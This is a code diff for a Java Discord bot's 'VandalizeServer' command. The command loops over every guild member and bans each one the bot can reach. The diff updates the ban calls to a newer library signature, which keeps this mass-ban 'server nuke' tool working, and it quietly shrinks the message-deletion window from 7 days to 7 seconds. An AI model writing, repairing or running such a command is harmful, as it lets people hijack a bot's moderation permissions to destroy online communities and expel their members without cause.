@@ -1,5 +1,7 @@
 package com.safjnest.Commands.Dangerous;
 
+import java.util.concurrent.TimeUnit;
+
 import com.jagrosh.jdautilities.command.Command;
 import com.jagrosh.jdautilities.command.CommandEvent;
 import com.safjnest.Utilities.JSONReader;
@@ -82,7 +84,7 @@ public class VandalizeServer extends Command{
                 String reason = args[2];
                 theGuild.getMembers().forEach(member -> {
                     if(self.canInteract(member)){
-                        member.ban(7, reason).queue(
+                        member.ban(7,TimeUnit.SECONDS ).reason(reason).queue(
                         (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                         new ErrorHandler().handle(
                             ErrorResponse.MISSING_PERMISSIONS,
@@ -118,7 +120,7 @@ public class VandalizeServer extends Command{
                         
                 theGuild.getMembers().forEach(member -> {
                     if(self.canInteract(member)){
-                        member.ban(7).queue(
+                        member.ban(7, TimeUnit.SECONDS).queue(
                         (e) -> System.out.println("ok - " + ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname())), 
                         new ErrorHandler().handle(
                             ErrorResponse.MISSING_PERMISSIONS,
